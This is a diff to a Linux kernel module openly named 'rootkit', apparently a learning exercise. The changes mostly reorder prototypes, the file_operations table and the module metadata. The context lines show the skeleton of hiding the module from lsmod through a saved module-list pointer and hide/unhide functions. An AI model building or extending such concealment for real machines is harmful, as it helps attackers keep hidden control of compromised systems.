@@ -1,5 +1,4 @@
 #include <linux/module.h>
-#include <linux/syscalls.h>
 #include <linux/types.h>
 #include <linux/fs.h>
 #include <linux/cdev.h>
@@ -8,17 +7,35 @@
 
 #define OURMODNAME	"rootkit"
 
-MODULE_AUTHOR("JACKERYLI");
-MODULE_DESCRIPTION("JACKERYLI");
-MODULE_LICENSE("Dual MIT/GPL");
-MODULE_VERSION("0.1");
-
 static int major;
 struct cdev *kernel_cdev;
 
-/* Hide rootkit from lsmod */
 static bool hidden;
 static struct list_head *prev_module;
+
+/**
+ * Function Prototypes
+*/
+static int  __init rootkit_init(void);
+static void __exit rootkit_exit(void);
+
+/******************* rootkit function **********************/
+static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg);
+static int  rootkit_open(struct inode *inode, struct file *filp);
+static int  rootkit_release(struct inode *inode, struct file *filp);
+
+/******************* hide/unhide function ******************/
+static void hide_rootkit(void);
+static void unhide_rootkit(void);
+
+
+const struct file_operations fops = {
+    open:rootkit_open,
+    unlocked_ioctl:rootkit_ioctl,
+    release:rootkit_release,
+    owner:THIS_MODULE
+};
+
 
 static void hide_rootkit(void)
 {
@@ -74,13 +91,6 @@ static int rootkit_release(struct inode *inode, struct file *filp)
 	return 0;
 }
 
-const struct file_operations fops = {
-    open:rootkit_open,
-    unlocked_ioctl:rootkit_ioctl,
-    release:rootkit_release,
-    owner:THIS_MODULE
-};
-
 /*
  * ref: https://linux-kernel-labs.github.io/refs/heads/master/labs/device_drivers.html
  */
@@ -123,3 +133,8 @@ static void __exit rootkit_exit(void)
 
 module_init(rootkit_init);
 module_exit(rootkit_exit);
+
+MODULE_AUTHOR("JACKERYLI");
+MODULE_DESCRIPTION("JACKERYLI");
+MODULE_LICENSE("Dual MIT/GPL");
+MODULE_VERSION("0.1");
